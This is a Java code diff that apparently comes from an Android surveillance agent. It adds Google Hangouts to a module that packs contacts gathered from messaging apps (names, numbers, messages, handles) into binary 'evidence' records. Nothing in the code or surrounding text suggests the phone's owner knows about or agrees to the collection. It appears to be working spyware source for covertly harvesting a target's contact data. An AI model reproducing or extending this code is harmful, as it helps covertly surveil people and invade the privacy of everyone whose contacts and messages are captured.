@@ -46,6 +46,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 	public static final int VIBER = 0x0b;
 	public static final int WECHAT = 0x0c;
 	public static final int TELEGRAM = 0x0e;
+	public static final int HANGOUT = 0x12;
 	public static final int LOCAL = 0x80000000;
 
 
@@ -309,6 +310,29 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 		return payload;
 	}
+	private static byte[] preparePacket(int type, long uid, String number, String name, String message, String handle) {
+
+		final ByteArrayOutputStream outputStream = prepareHeader(uid, type, 0);
+		if (outputStream == null) {
+			return null;
+		}
+
+		addTypedString(outputStream, (byte) 0x01, name);
+		addTypedString(outputStream, (byte) 0x07, number);
+		addTypedString(outputStream, (byte) 0x37, message);
+
+		addTypedString(outputStream, (byte) 0x40, handle);
+
+		final byte[] payload = outputStream.toByteArray();
+
+		final int size = payload.length;
+
+		// a questo punto il payload e' pronto
+		final DataBuffer db_header = new DataBuffer(payload, 0, 4);
+		db_header.writeInt(size);
+
+		return payload;
+	}
 
 	private static ByteArrayOutputStream prepareHeader(long uid, int program, int flags) {
 		final int version = 0x01000001;
@@ -422,6 +446,21 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		return needToSerialize;
 	}
 
+	public static boolean createEvidenceRemoteFull(int type, long id, String name,String number,String extra, String handle) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (createEvidenceRemoteFull) type: " + type + " id: " + id + " name: " + name + " extra:" + extra + " handle:" + handle);
+		}
+
+		byte[] packet = preparePacket(type, id, number, name, extra,handle);
+		boolean needToSerialize = serializeIfNew(id, packet);
+		if (needToSerialize) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createEvidenceRemoteFull) new address");
+			}
+			EvidenceBuilder.atomic(EvidenceType.ADDRESSBOOK, null, packet);
+		}
+		return needToSerialize;
+	}
 	public static ModuleAddressBook getInstance() {
 		return (ModuleAddressBook) ManagerModule.self().getInstancedAgent(ModuleAddressBook.class);
 	}
